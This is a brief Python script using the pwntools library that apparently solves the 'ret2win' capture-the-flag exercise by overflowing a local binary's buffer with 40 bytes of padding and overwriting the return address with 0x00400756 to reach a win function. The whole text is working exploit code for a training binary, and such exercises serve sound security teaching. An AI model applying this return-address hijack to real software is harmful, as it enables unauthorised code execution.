from pwn import *

pr = process("./ret2win")
ret2win = p64(0x00400756)

payload = "A"* 40 + ret2win

pr.sendline(payload)
pr.interactive()
